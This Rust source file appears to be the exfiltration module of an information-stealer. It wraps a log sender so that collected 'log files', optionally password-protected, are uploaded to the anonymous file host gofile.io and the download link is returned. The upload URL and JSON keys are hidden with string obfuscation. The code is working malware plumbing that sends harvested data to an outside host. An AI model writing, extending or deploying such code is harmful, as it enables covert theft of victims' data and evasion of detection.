use crate::external_upload::{base_upload, Uploader};
use crate::{LogContent, LogFile, LogSender, SendError};
use alloc::string::String;
use alloc::vec::Vec;
use collector::Collector;
use delegate::delegate;
use derive_new::new;
use json::parse;
use obfstr::obfstr as s;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};

/// https://gofile.io uploader wrapper around an inner [`LogSender`].
#[derive(Clone)]
pub struct GofileSender<T: LogSender> {
    inner: Uploader<T>,
}

impl<T: LogSender> GofileSender<T> {
    pub fn new(inner: T) -> Self {
        Self {
            inner: Uploader::new(inner, upload),
        }
    }
}

fn upload(name: &str, bytes: &[u8]) -> Option<String> {
    let response = base_upload(name, s!("https://upload.gofile.io/uploadFile"), bytes)?;

    Some(
        parse(response.body())
            .ok()?
            .get(s!("data"))?
            .get(s!("url"))?
            .as_string()?
            .clone(),
    )
}

impl<T: LogSender> LogSender for GofileSender<T> {
    delegate! {
        to self.inner {
            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
            where P: AsRef<str> + Clone, C: Collector;
        }
    }
}
